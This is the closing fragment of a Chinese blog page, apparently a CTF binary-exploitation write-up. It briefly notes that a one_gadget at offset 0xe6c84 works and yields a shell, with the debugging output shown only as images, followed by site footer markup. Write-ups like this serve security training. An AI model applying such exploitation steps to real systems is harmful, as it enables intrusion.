<span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>调试可以发现这个可以通</p> <p><img src="https://s2.loli.net/2022/03/03/1ctNlGI5qY9ZEju.png" alt="image-20220303220924999"></p> <p>观察下one gadget</p> <p><img src="https://s2.loli.net/2022/03/03/HuhcfYGQtxWykmd.png" alt="image-20220303221056510"></p> <p>其中这个 0xe6c84 的onegadget可以成功</p> <p><img src="https://s2.loli.net/2022/03/03/dcoZSBCLyNqwgXa.png" alt="image-20220303221200515"></p> <p>然后可以getshell</p></div></div> <!----> <div class="page-edit"><!----> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">3/3/2022, 2:13:39 PM</span></div></div> <div class="page-nav-wapper"><!----> <!----></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:wl200103124@163.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/wlingze" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://blog.csdn.net/wlz_lc_4" title="csdn" target="_blank" class="iconfont icon-csdn"></a><a href="https://www.zhihu.com/people/wlingze" title="zhihu" target="_blank" class="iconfont icon-zhihu"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2022
    <span>lingze | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.01f8cc77.js" defer></script><script src="/assets/js/2.5ece5099.js" defer></script><script src="/assets/js/48.fa3498f4.js" defer></script>
  </body>
</html>
